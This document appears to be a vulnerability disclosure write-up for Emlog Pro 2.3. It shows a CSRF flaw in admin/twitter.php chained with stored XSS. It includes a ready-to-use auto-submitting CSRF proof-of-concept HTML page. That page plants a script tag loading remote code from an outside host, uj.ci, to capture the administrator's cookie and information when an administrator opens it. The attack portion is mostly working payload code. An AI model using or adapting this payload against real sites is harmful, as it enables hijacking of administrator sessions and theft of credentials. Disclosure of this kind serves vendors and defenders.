# Emlog Pro 2.3 twitter.php has CSRF and works with XSS to get administrator information

- **Exploit Title:** Emlog Pro 2.3 has CSRF and works with XSS to get administrator information
- **Date:** 2024-04-01
- **Exploit Author:** shuo sheng,jixin zhang
- **Vendor Homepage:** https://www.emlog.net/
- **Software Link:**https://oss.emlog.net/download/release/emlog_pro_2.3.1.zip
- **Version:** pro2.3

burp to grab the packet

url:http://127.0.0.1/emlog/admin/twitter.php
![图片](https://github.com/ss122-0ss/cms/assets/131983607/b2c3af6a-3834-4665-818a-cd4ea4959e8f)


Use BurpSuite to generate CSRF-POCs, copy them, and test them with a browser or HTML

利用burpsuite生成csrf-poc,复制，用浏览器或者html测试
![图片](https://github.com/ss122-0ss/cms/assets/131983607/1c118a37-0851-40a6-a6e4-4aa6841f0077)

Paste the address generated by burpsuite, create a test, and the test is successful

粘贴burpsuite生成的地址，创建了一个test，测试成功

![图片](https://github.com/ss122-0ss/cms/assets/131983607/a74ba643-3c80-4a58-a685-06108205b653)

Due to the XSS vulnerability here, it can be used with XSS to obtain the administrator cookie and information, and the reproduction process is as follows:

Create a 1.html

payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1/emlog/admin/twitter.php?action=post" method="POST">
      <input type="hidden" name="t" value="&lt;sCRiPt&#32;sRC&#61;&#47;&#47;uj&#46;ci&#47;szi&gt;&lt;&#47;sCrIpT&gt;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

Triggered when an administrator accesses a 1.html

```html
<sCRiPt sRC=//uj.ci/szi></sCrIpT>
```

Malicious code is executed, and administrator information is obtained
![图片](https://github.com/ss122-0ss/cms/assets/131983607/f5d42616-2e6f-4947-80a4-087400060f0b)
images\image-20240402170318880.png)
